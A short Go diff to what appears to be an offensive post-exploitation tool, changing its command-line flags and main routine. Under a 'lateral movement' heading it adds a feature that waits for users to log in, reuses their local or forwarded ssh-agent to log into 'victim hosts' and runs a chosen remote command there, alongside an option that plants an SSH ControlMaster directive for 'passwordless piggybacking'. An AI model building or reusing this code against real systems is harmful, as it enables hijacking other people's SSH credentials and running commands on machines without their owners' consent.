@@ -35,10 +35,10 @@ var (
 	flag_ssh_cm    = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
 	flag_rm_ssh_cm = flag.String("rm-ssh-cm", "", "Undo --ssh-cm. If the config file is empty after the undo, it will be removed.")
 	// Active - lateral movement
-	flag_stalk_ruser                = flag.String("stalk-ruser", "", "Wait until a user logs in locally and attempt to also log into that host.")
-	flag_stalk_ruser_login_attempts = flag.Int("stalk-ruser-login-login-attempts", 2, "Only attempt to log into potential victim hosts this many times. Governs all login attempts, even for multiple users (when \"*\" is used).")
+	flag_stalk_ruser                = flag.String("stalk-ruser", "*", "Wait until a user logs in locally and attempt to reuse local/forwarded ssh-agent. If \"*\" is specified, stalk any user who logs in; if user foo logs in, remote login will be made as user foo.")
+	flag_stalk_ruser_login_attempts = flag.Int("stalk-ruser-login-attempts", 2, "Only attempt to log into potential victim hosts this many times. Governs all login attempts, even for multiple users (when \"*\" is used). If multiple ssh-agents are present, max attempts is per-agent.")
 	flag_stalk_ruser_poll_freq      = flag.Int("stalk-ruser-poll-freq", 10, "Frequency in seconds to inspect who's logged in.")
-	flag_stalk_ruser_cmd            = flag.String("stalk-ruser-cmd", "", "Command to execute on remote host after successful login.")
+	flag_stalk_ruser_cmd            = flag.String("stalk-ruser-cmd", "", "Command to execute on remote host upon successful login.")
 
 	flag_verbose = flag.Bool("verbose", false, "Print status information")
 )
@@ -310,16 +310,16 @@ func main() {
 		})
 	}
 	if *flag_stalk_ruser != "" {
-		fmt.Println(*flag_stalk_ruser)
 		if *flag_stalk_ruser_login_attempts < 0 {
 			fatal("login attempts must be >= 0")
 		} else if *flag_stalk_ruser_poll_freq <= 0 {
 			fatal("poll frequency must be >= 1")
 		}
 		disc.StalkRemoteLogin(disc.StalkRemoteLoginParams{
-			Action:        disc.AttemptRemoteLogin,
+			Action:        disc.AttemptRemoteExec,
 			LoginLimit:    uint(*flag_stalk_ruser_login_attempts),
 			PollFrequency: uint(*flag_stalk_ruser_poll_freq),
+			RemoteCommand: *flag_stalk_ruser_cmd,
 			User:          *flag_stalk_ruser,
 		})
 	}
